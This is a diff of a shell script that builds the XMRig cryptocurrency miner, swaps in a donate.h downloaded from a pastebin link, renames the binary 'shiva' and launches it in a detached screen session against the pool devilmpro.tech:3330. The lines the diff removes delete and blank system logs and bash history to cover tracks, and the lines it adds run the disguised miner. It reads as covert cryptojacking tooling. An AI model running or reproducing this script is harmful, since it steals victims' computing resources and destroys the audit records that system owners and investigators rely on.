@@ -3,52 +3,29 @@ sudo apt-get update
 sudo apt-get upgrade -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen msr-tools -y
 sudo modprobe msr
-sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
-sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
-sudo chmod +x *.sh
-sudo ./enable_1gb_pages.sh
-sudo ./randomx_boost.sh
 git clone https://github.com/xmrig/xmrig.git
 apt install curl -y
 cd
 mv xmrig pro
-cd pro 
-cd src 
+cd pro/src
 sudo rm -rf donate.h
-cd
-cd pro
-cd src
+cd 
+cd pro/src
 curl https://pastebin.com/raw/WvFUTQTq --output donate.h
 cd
 cd pro
 mkdir build
-cd build
+cd pro/build
 cmake ..
 make -j$(nproc)
 cd 
-cd pro
-cd build
+cd pro/build
 sudo mv xmrig shiva
 cd
-cd pro
-cd build
-screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
-cd 
-sudo rm enable_1gb_pages.sh
-sudo rm randomx_boost.sh
-sudo /bin/rm /var/log/alternatives.log
-sudo rm /var/log/auth.log
-sudo rm /var/log/dpkg.log
-sudo rm /var/log/kern.log
-sudo rm -r /var/log/journal
-sudo rm  .bash_history
-sudo bash -c 'echo >/var/log/wtmp'
-sudo bash -c 'echo >/var/log/btmp'
-sudo bash -c 'echo >/var/log/lastlog'
-sudo bash -c echo >/var/log/syslog'
-sudo bash -c 'echo >/var/log/bootstrap.log'
-sudo bash -c 'echo >/var/log/faillog'
-sudo bash -c 'echo /var/log/cloud-init-output.log'
-sudo bash -c 'echo cloud-init.log'
-sudo bash -c 'echo >/var/log/apt/history.log'
-sudo bash -c 'echo >/var/log/apt/term.log'
+cd pro/build
+screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id MAHI15D -t 2
+cd
+sudo pkill shiva
+cd pro/build
+screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --cpu-affinity 0x0 --randomx-1gb-pages --rig-id MAHI15D -t 2
+
